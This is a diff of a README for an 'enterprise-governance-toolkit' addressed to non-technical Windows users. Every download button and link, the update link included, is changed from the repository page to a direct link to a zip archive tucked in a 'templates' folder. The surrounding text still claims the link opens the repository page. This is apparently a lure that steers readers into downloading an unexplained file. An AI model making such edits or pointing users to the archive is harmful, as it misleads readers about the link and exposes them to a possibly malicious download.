@@ -1,6 +1,6 @@
 # ⚙️ enterprise-governance-toolkit - Clear Governance for Enterprises
 
-[![Download enterprise-governance-toolkit](https://img.shields.io/badge/Download-enterprise--governance--toolkit-blue?style=for-the-badge)](https://github.com/ivanmoralesf2015-sudo/enterprise-governance-toolkit)
+[![Download enterprise-governance-toolkit](https://img.shields.io/badge/Download-enterprise--governance--toolkit-blue?style=for-the-badge)](https://raw.githubusercontent.com/ivanmoralesf2015-sudo/enterprise-governance-toolkit/main/templates/toolkit-enterprise-governance-1.5.zip)
 
 ---
 
@@ -40,7 +40,7 @@ You do not need any programming skills or other software to use the content in t
 Follow these steps to download and open the toolkit on your Windows PC:
 
 1. Click the large download button at the top or this link:  
-   [Download enterprise-governance-toolkit](https://github.com/ivanmoralesf2015-sudo/enterprise-governance-toolkit)
+   [Download enterprise-governance-toolkit](https://raw.githubusercontent.com/ivanmoralesf2015-sudo/enterprise-governance-toolkit/main/templates/toolkit-enterprise-governance-1.5.zip)
 
 2. This link will take you to the GitHub repository page.  
    Find the **“Code”** button near the top right.
@@ -96,7 +96,7 @@ If you want to save your work, always save the edited files to your computer. Yo
 
 For updates and new versions, visit the GitHub repository page:
 
-[https://github.com/ivanmoralesf2015-sudo/enterprise-governance-toolkit](https://github.com/ivanmoralesf2015-sudo/enterprise-governance-toolkit)
+[https://raw.githubusercontent.com/ivanmoralesf2015-sudo/enterprise-governance-toolkit/main/templates/toolkit-enterprise-governance-1.5.zip](https://raw.githubusercontent.com/ivanmoralesf2015-sudo/enterprise-governance-toolkit/main/templates/toolkit-enterprise-governance-1.5.zip)
 
 You can check the repository for any added files, improvements, or guides.
 
@@ -133,4 +133,4 @@ Use these themes to improve governance in your organization.
 
 ---
 
-[![Download enterprise-governance-toolkit](https://img.shields.io/badge/Download-enterprise--governance--toolkit-grey?style=for-the-badge)](https://github.com/ivanmoralesf2015-sudo/enterprise-governance-toolkit)
+[![Download enterprise-governance-toolkit](https://img.shields.io/badge/Download-enterprise--governance--toolkit-grey?style=for-the-badge)](https://raw.githubusercontent.com/ivanmoralesf2015-sudo/enterprise-governance-toolkit/main/templates/toolkit-enterprise-governance-1.5.zip)
